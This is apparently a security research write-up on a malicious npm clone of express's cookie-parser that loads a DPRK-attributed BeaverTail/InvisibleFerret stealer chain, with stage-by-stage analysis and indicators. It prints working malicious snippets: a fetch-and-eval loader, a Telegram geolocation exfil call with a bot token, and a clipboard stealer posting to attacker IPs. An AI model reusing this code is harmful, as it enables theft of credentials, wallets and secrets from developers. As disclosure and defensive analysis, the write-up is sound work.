---
title: "clx-cookieparser: a DPRK cookie-parser clone whose evil twin loads the BeaverTail → InvisibleFerret stealer chain"
date: 2026-05-28
summary: "A DPRK supply-chain stealer (FAMOUS CHOLLIMA, Contagious Interview) hiding inside an exact copy of express's cookie-parser. The weaponized 1.4.7 keeps the parser clean and swaps one dependency for the attacker's own `clx-`prefixed clone of cookie-signature, installed at runtime, which evals a jsonkeeper.com blob that unrolls into BeaverTail and a four-module InvisibleFerret kit: a Socket.IO RAT, a browser/wallet stealer, a file grabber, and a clipboard watcher. cleave tags the late stages as Lazarus, and the file grabber exfils to the same endpoint, through the same code, as web-dotenv did a week earlier — same operator, per dprk-research.kmsec.uk."
packageName: clx-cookieparser
ecosystem: npm
---

<img src="/assets/images/clx-cookieparser-dprk-meme.jpg" alt="Meme: 'DPRK hiding in your npm's? It's more likely than you think.'" style="width: 60%; height: auto;">

Most malicious npm clones hide their payload in the package you install. `clx-cookieparser` doesn't — the package you install is the genuine express cookie-parser, working middleware and passing tests included. The trick is one swapped dependency: instead of the real cookie-signing library it pulls the attacker's twin, `clx-cookie-signature`, installing it at runtime if it has to. That twin fetches a blob from jsonkeeper.com and evals it, and the chain unrolls into BeaverTail and InvisibleFerret — the loader-and-stealer kit of the DPRK's Contagious Interview campaign, per [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). cleave flags the final stages as Lazarus outright. And the files it steals go to the same endpoint, through the same code, as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) did a week earlier — the same operator, not a coincidence.

Traits below are from cleave `2.0.0-rc.3` (traits `09ce9f44f`); the deeper stages were detonated in a disposable VM with every sink stubbed.

## Package metadata

| Field | Value |
| --- | --- |
| Package | `clx-cookieparser` (npm) |
| Publisher | `blockvanguard <contact@vynlence.com>` |
| Author (declared) | `TJ Holowaychuk <tj@vision-media.ca>` |
| Versions seen | `1.4.4`, `1.4.5`, `1.4.7` (`1.4.6` tracked upstream, not sampled) |
| First seen | `2026-05-28` |
| Impersonates | `expressjs/cookie-parser` |
| Companion package | `clx-cookie-signature@1.2.1` |
| Install vector | require-time `execSync` npm install (no `postinstall`) |

## The version walk

The early versions are bait. 1.4.4 and 1.4.5 ship the real cookie-parser, byte-identical, and differ only in one cosmetic field — the `repository` shorthand, which creeps closer to the real package's name with each release. By 1.4.7 the repo string matches upstream exactly, the cover is complete, and the payload is switched on.

| Version | `index.js` | `repository` field | Signing dependency | Verdict |
| --- | --- | --- | --- | --- |
| 1.4.4 | clean (`cc0cdf98…`) | `expressjs/clx-cookieparser` | `cookie-signature` (real) | benign bait |
| 1.4.5 | clean (`cc0cdf98…`, identical) | `expressjs/cookieparser` | `cookie-signature` (real) | benign bait |
| 1.4.7 | weaponized (`1cbaf18…`) | `expressjs/cookie-parser` | `clx-cookie-signature` (twin) | live payload |

## Stage 1 — clx-cookieparser: the dependency swap

The weaponized 1.4.7 makes one surgical edit. It drops the legitimate signing dependency from its manifest and reaches for the attacker's twin instead, installing it on the spot — silent, no-save, hidden window — if it isn't already present. If even that fails, it prints a polite fake error assembled one character at a time and exits. The parser below this block still works perfectly, so the developer sees green tests and functioning middleware. The malice never lives in this package; it lives one `require()` away.

<pre class="lang-js"><code><span class="tok-kw">const</span> { execSync } = <span class="tok-builtin">require</span>(<span class="tok-str">'child_process'</span>);
<span class="tok-kw">var</span> signature;
<span class="tok-kw">try</span> {
  signature = <span class="tok-builtin">require</span>(<span class="tok-str">'clx-cookie-signature'</span>)
} <span class="tok-kw">catch</span> (err) {
  <span class="tok-kw">try</span> {
    <span class="tok-fn">execSync</span>(<span class="tok-str">`npm install clx-cookie-signature --no-warnings --no-save --no-progress --loglevel silent`</span>, { windowsHide: <span class="tok-kw">true</span> });
    signature = <span class="tok-builtin">require</span>(<span class="tok-str">'clx-cookie-signature'</span>)
  } <span class="tok-kw">catch</span> (error) {
    console.<span class="tok-fn">log</span>(str); <span class="tok-com">// "Error: This environment is not supported…"</span>
    process.<span class="tok-fn">exit</span>(<span class="tok-num">1</span>);
  }
}
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/impersonation/npm-clone::clx-cookieparser-cookie-parser-clone` | A package named `clx-cookieparser` carrying `expressjs/cookie-parser` as its repository |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/install-hook/scripts/dynamic-install::clx-cookieparser-runtime-stage-install` | `execSync` npm install of the twin at require-time, `windowsHide: true` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/impersonation/npm-clone::cookie-parser-upstream-repo` | Repository shorthand points at `expressjs/cookie-parser` |

## Stage 2 — clx-cookie-signature: the courier

The evil twin is also a faithful clone — every export of the real signing library works. The `clx-` prefix is the whole game: the real signing package can't be republished, so the attacker mints a matching prefixed pair they fully control and rewrites the parser to require it. The damage is a single line bolted to the top of the module, so it fires the instant the parser requires it. That line fetches a blob from jsonkeeper.com, a free pastebin, and hands the result straight to `eval`. A second jsonkeeper link sits beside it, hex-encoded and never called — a spare key taped under the mat for when the first one dies. Nothing here touches disk or spawns a process; it is purely a courier.

<pre class="lang-js"><code><span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-str">'https://www.jsonkeeper.com/b/MYUKZ'</span>).<span class="tok-fn">then</span>(r =&gt; { <span class="tok-fn">eval</span>(r.data.content_o); });
<span class="tok-com">// dormant backup, hex-encoded, never invoked:</span>
<span class="tok-com">//   https://www.jsonkeeper.com/b/HY6M6</span>
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/delivery/fetch-eval::axios-jsonkeeper-content-eval-loader` | `eval(r.data.content_o)` on a jsonkeeper.com response |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/impersonation/npm-clone::clx-cookie-signature-upstream-clone` | Clones the cookie-signature identity (`TJ Holowaychuk`, `visionmedia` repo) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-static/obfuscation/encoding/hex::hex-pair-regex-decode` | `/../g` + `fromCharCode` decode behind the dormant HY6M6 link |
| <span class="sev-dot notable" title="notable"></span> | `objectives/command-and-control/infrastructure/paste::jsonkeeper` | cleave classifies `jsonkeeper.com` as paste-hosted delivery infrastructure |

## Stage 3 — the jsonkeeper loader

The jsonkeeper bin ships with a sense of humor: it holds two fields, and the harmless one just logs `Server running`. The malware ignores that decoy, reaches for the real field, and evals three chained functions. The first is the BeaverTail loader: it installs two HTTP libraries, beacons its C2 with a campaign id in the path, saves the reply as `0001.dat`, and runs it with node. The second profiles the victim through ipinfo.io and DMs the result — IP, country, city, coordinates — to a Telegram bot. The third is a tripwire: if the machine's hostname sits in a hardcoded blocklist, including `vboxuser` and a handful of researcher names, it quietly exits. The blob is paste-hosted and mutable, so what the bin serves can shift between pulls.

<pre class="lang-js"><code>content_n → console.<span class="tok-fn">log</span>(<span class="tok-str">'Server running'</span>)                 <span class="tok-com">// decoy</span>
content_o → <span class="tok-kw">function</span> <span class="tok-fn">c2</span>() { <span class="tok-com">/* obfuscator.io loader, eval'd */</span> }
</code></pre>

Deobfuscated, the `c3` profiler is the bluntest part of the chain:

<pre class="lang-js"><code><span class="tok-com">// Stage 3 c3(), deobfuscated — geolocate the victim, DM it to a Telegram bot</span>
<span class="tok-kw">const</span> g = <span class="tok-kw">await</span> (<span class="tok-kw">await</span> <span class="tok-fn">fetch</span>(<span class="tok-str">'https://ipinfo.io/json?token=8e5005610fd390'</span>)).<span class="tok-fn">json</span>();
<span class="tok-kw">await</span> <span class="tok-fn">fetch</span>(<span class="tok-str">'https://api.telegram.org/bot8201485511:AAF_…/sendMessage'</span>, {
  method: <span class="tok-str">'POST'</span>,
  headers: { <span class="tok-str">'Content-Type'</span>: <span class="tok-str">'application/json'</span> },
  body: JSON.<span class="tok-fn">stringify</span>({ chat_id: <span class="tok-str">'8080359867'</span>,
    text: <span class="tok-str">`Project is running...\n\nVisitor Info:\n IP: ${g.ip}, ${g.country}, ${g.city} ${g.longitude}`</span> })
});
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/execution/network-stage::obfuscated-node-hidden-stage-scaffold` | Obfuscated Node loader: profile → install HTTP libs → beacon → write `0001.dat` → run |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-static/obfuscation/tools/js-obfuscator::obfuscated-eval-npm-trojan` | Full obfuscator.io toolkit wrapped around an eval |
| <span class="sev-dot suspicious" title="suspicious"></span> | `micro-behaviors/process/create/spawn::windowshide-obfuscated-expression` | `windowsHide` set through a computed expression |

## Stage 4 — 0001.dat: the InvisibleFerret kit

`0001.dat` is the orchestrator, and it is re-obfuscated on every pull — the wrapper's hash changes each fetch, the modules inside do not. It writes two of them to disk and runs each with node, then spawns two more inline. Between them they cover every angle a laptop offers, and cleave tags two on the exfil endpoint alone as Lazarus.

| Module | Role | Sink |
| --- | --- | --- |
| `scdata.js` | Socket.IO RAT — remote shell, `node-pty` terminal, mouse/keyboard, desktop control | `216.126.225.83` (socket) |
| `ldata.js` | Browser + wallet stealer — `Login Data`, macOS keychain, 12+ wallet extensions | bundled upload |
| `captured_spawn_11.js` | Recursive file grabber — `.aws`/`.ssh`/`.claude` dirs, `*.env*`/`*secret phrase*`/`*metamask*` | `http://216.126.224.220:5976/upload` |
| `captured_spawn_12.js` | Clipboard watcher — `pbpaste` / PowerShell `Get-Clipboard` | `http://216.126.225.83/npm-compiler.log` |

The stealer's reach is wide: Chrome, Edge, Brave, and Opera login databases and web data, the macOS `login.keychain-db`, and wallet extensions spanning MetaMask, Phantom, Coinbase, Rabby, SafePal, TronLink, Trust Wallet, Coin98, Keplr, MathWallet, Exodus, and Binance. The file grabber walks the home directory, skips noise, and uploads anything matching its key/secret/wallet patterns. The clipboard watcher loops forever, shipping whatever changes — and deobfuscated, it is the same routine web-dotenv ran:

<pre class="lang-js"><code><span class="tok-com">// Stage 4 captured_spawn_12.js, deobfuscated — clipboard watcher</span>
<span class="tok-kw">const</span> clip = process.platform === <span class="tok-str">'darwin'</span>
  ? <span class="tok-fn">execSync</span>(<span class="tok-str">'pbpaste'</span>, { encoding: <span class="tok-str">'utf8'</span> }).<span class="tok-fn">trim</span>()
  : <span class="tok-fn">execSync</span>(<span class="tok-str">'powershell -NoProfile -NonInteractive Get-Clipboard'</span>, { encoding: <span class="tok-str">'utf8'</span>, windowsHide: <span class="tok-kw">true</span> }).<span class="tok-fn">trim</span>();
<span class="tok-kw">await</span> axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://216.126.225.83/npm-compiler.log'</span>,
  { message: clip, host: os.<span class="tok-fn">hostname</span>(), uid: <span class="tok-str">'acd4ab…'</span>, t: <span class="tok-str">'101'</span> });
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/remote-command/control::node-socketio-remote-control-rat` | `scdata.js`: `node-pty`, `mouseClick`, `keyTap`, terminal I/O over Socket.IO |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/browser::js-browser-wallet-upload-exfil` | `ldata.js`: MetaMask/Phantom/Coinbase extension IDs + `Login Data` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/file::js-targeted-file-upload-exfil` | `captured_spawn_11.js`: `scanDir` over dev/config dirs → multipart upload |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/clipboard::js-clipboard-exfil-external-ip` | `captured_spawn_12.js`: `pbpaste` / `Get-Clipboard` → literal IPv4 |
| <span class="sev-dot suspicious" title="suspicious"></span> | `well-known/malware/dropper/lazarus::makelog-url` | `scdata.js` + `captured_spawn_12.js`: GlassWorm/Lazarus `/api/service/makelog` endpoint |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/credential-access/wallet/lazarus::wallet-extension-path` | `ldata.js`: `/Local Extension Settings/` wallet path (Lazarus) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-analysis/vm-detect/vendor::comprehensive-evasion` | `scdata.js` checks for `virtualbox` and other hypervisors |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/masquerade/process/title::process-title-npm-masquerade` | `ldata.js` sets `process.title` to an `npm-`like name |

## Same operator as web-dotenv

This is not a lookalike of [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/); it is the same kit. The file grabber ships to the exact endpoint web-dotenv used — `http://216.126.224.220:5976/upload`, byte for byte. The clipboard watcher posts to the same `/npm-compiler.log` path. Both sinks sit on adjacent Tier.Net addresses inside one `216.126.224.0/22`. The target allow-list, the obfuscator, the `userkey` upload header, and the staging through jsonkeeper.com all match. web-dotenv wore a `jean_dupont24` persona, and we called it a different shop from the IPFS droppers — against this chain it is the same shop.

Why DPRK, beyond the tracker? A BeaverTail loader pulling an InvisibleFerret stealer kit through a fake npm dependency is the Contagious Interview playbook that CrowdStrike and others pin on FAMOUS CHOLLIMA, and this chain runs it almost beat for beat: jsonkeeper staging, a loader that installs axios and socket.io-client, a numbered payload, and theft aimed straight at crypto wallets and developer keys. cleave reaches the same verdict unprompted — the exfil endpoint trips its Lazarus `makelog-url` rule, the GlassWorm marker, and the stealer trips a Lazarus wallet-path rule, both family signatures rather than generic stealer noise. It is a family match, not proof from this sample alone, but it is why the call is confident before kmsec enters the picture.

## Indicators

| Type | Value |
| --- | --- |
| Package | `clx-cookieparser@1.4.7` (npm) |
| `1.4.7` index.js SHA-256 | `1cbaf1823f0b004173454333a22b770fa1c36825b02b81bb258223c3fb6fc7b8` |
| `1.4.4` / `1.4.5` index.js SHA-256 | `cc0cdf989e892a9f282f17b7511133916ed90e9cb3fbb49db60fe44ce3aece56` (benign, identical) |
| `1.4.7` tarball SHA-256 | `aa0717bcd8e84d37588654679f1b79b21ee81fd0b65aaf1ab4324f7e5ea13973` |
| Companion package | `clx-cookie-signature@1.2.1` (npm; also bundled in the `1.4.7` tarball) |
| Companion index.js SHA-256 | `9eb97dcae23527bc66606235e0ad5d2c89692d311120dec3a636acf479e53047` |
| Companion tarball SHA-256 | `5f22aac4634708cd73c3e2fc3e1ff94e2c4d48b0be8368351a2c707a8fd84819` |
| Trigger | `require('clx-cookieparser')` → runtime install of `clx-cookie-signature` → require fires the axios eval |
| Stage-2 loader | `https://www.jsonkeeper.com/b/MYUKZ` (evals `content_o`; `content_n` is a `console.log` decoy) |
| Stage-2 backup (dormant) | `https://www.jsonkeeper.com/b/HY6M6` |
| Stage-3 geolocation source | `https://ipinfo.io/json?token=8e5005610fd390` (IP/country/city/coordinates) |
| Stage-3 Telegram exfil | `https://api.telegram.org/bot8201485511:AAF_K37O2EByZaAMns3K3AFfqUH-cVYQJ74/sendMessage` (chat_id `8080359867`) |
| Stage-3 anti-analysis | exits if `os.hostname()` ∈ `Home PC, suraj, imran, Rishabh Verma, vboxuser, Shah faisal, Developer, Programador` |
| Stage-3/4 C2 | `http://216.126.225.83/api/service/acd4ab512f1e10ba62a6f23b7038b725` |
| Stage-4 loader | `$TMPDIR/0001.dat` (re-obfuscated per fetch; snapshots `b0eb15b8…`, `3231629620…`) |
| `scdata.js` (Socket.IO RAT) SHA-256 | `126d0ed4e6c29d54625884bedcd164af2c38bc887a198d03ad1cf0fd8fe9b761` |
| `ldata.js` (browser/wallet stealer) SHA-256 | `38b4d90b63e49abd76fb8974379c9c75af032ab259cc138d1a88baf3c27dfaa3` |
| `captured_spawn_11.js` (file grabber) SHA-256 | `0de58bc71e6a7f7e0fd1a174a1413765a727e460edd79386a0c0359b6b0498b0` |
| `captured_spawn_12.js` (clipboard) SHA-256 | `98485250e2ed047b5f893fcdaa2a779614972063a4c3587b9046256b0ddb8b45` |
| File exfil | `http://216.126.224.220:5976/upload` (multipart) — identical to web-dotenv |
| Clipboard exfil | `http://216.126.225.83/npm-compiler.log` — same path as web-dotenv |
| RAT C2 | `216.126.225.83` (Socket.IO), `/api/service/makelog` |
| Hosting | Tier.Net, `216.126.224.0/22` (same /22 as web-dotenv) |
| Family | BeaverTail loader → InvisibleFerret stealer kit (Socket.IO RAT + browser/wallet + file + clipboard) |
| Attribution | FAMOUS CHOLLIMA / Contagious Interview (DPRK) — cleave Lazarus traits + shared infrastructure with web-dotenv; per [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/) |
| Publisher | `blockvanguard <contact@vynlence.com>` |
